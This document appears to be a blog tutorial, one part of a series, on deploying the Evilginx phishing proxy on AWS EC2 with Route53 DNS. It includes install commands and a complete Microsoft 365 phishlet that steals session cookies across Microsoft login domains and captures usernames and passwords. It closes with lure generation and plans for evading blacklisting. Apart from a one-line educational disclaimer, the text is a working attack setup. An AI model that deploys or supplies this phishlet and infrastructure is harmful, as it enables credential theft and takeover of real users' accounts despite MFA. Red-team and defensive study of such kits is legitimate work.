---
# categories:
# - Phishing
# - Evilginx
# tags:
# - Phishing
# - Evilginx
toc: true

---

> **Note**: This guide is for educational purposes only to understand phishing techniques and improve defense mechanisms.

### Setting up the Domain

This post continues our series on understanding phishing infrastructure. We'll cover setting up a domain on AWS EC2 and configuring phishlets.

### Setting up the Nameservers with Route53

1. Create a hosted zone in Route53
2. Configure nameservers for your domain

### Setting up the VPS with EC2

1. Launch an Ubuntu free-tier instance
2. Generate SSH key pair
3. Configure network settings:
   - Allow SSH from your IP only:
   ```bash
   # Get your public IP
   curl http://ipinfo.io/ip 
   ```
   - Allow HTTP/HTTPS (port 80/443) from anywhere
   - Allow DNS (port 53) from anywhere

### Installing and Configuring Evilginx

1. Install Go:

```bash
sudo apt update
cd ~
curl -OL https://golang.org/dl/go1.21.6.linux-amd64.tar.gz
sha256sum go1.21.6.linux-amd64.tar.gz
sudo tar -C /usr/local -xvf go1.21.6.linux-amd64.tar.gz

# Add Go to PATH
echo "export PATH=\$PATH:/usr/local/go/bin" >> ~/.profile
source ~/.profile
go version
```

2. Install Evilginx:
```bash
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make
sudo ./build/evilginx -p /phishlets/
```

3. Basic Evilginx commands:

```bash
# View help
help

# Configure domain
config domain yourdomain.com

# Configure instance IP
config ipv4 your.instance.ip
```

### Configuring the M365 Phishlet

Create a phishlet configuration file:

```yaml
min_ver: '3.2.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'logon', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
sub_filters:
auth_tokens:
  - domain: '.live.com' #domain that sends the cookie
    keys: ['.*:regexp'] #name of cookie to steal
  - domain: 'live.com'
    keys: ['.*:regexp']
  - domain: '.login.live.com'
    keys: ['.*:regexp']
  - domain: 'login.live.com'
    keys: ['.*:regexp']
  - domain: '.login.microsoftonline.com'
    keys: ['.*:regexp']
  - domain: 'login.microsoftonline.com'
    keys: ['.*:regexp']  
  - domain: '.microsoft.com'
    keys: ['.*:regexp'] 
  - domain: 'microsoft.com'
    keys: ['.*:regexp']
  - domain: '.office.com'
    keys: ['.*:regexp']
  - domain: 'office.com'
    keys: ['.*:regexp']
  - domain: '.www.office.com'
    keys: ['.*:regexp']
  - domain: 'www.office.com'
    keys: ['.*:regexp']
auth_urls:
  - '/landingv2'
credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
login:
  domain: 'login.microsoftonline.com'
  path: '/' # path to where the login is, on the domain.    
```

### DNS Configuration

Point these subdomains to your instance IP:
- login.yourdomain.com
- logon.yourdomain.com
- www.yourdomain.com

### Creating Lures

```bash
# Create a lure for M365
lures create m365

# Get the phishing URL
lures get-url <id>
```

### Additional Security Measures

To prevent blacklisting, we'll set up a secondary domain with Apache in the next part of this series.

---

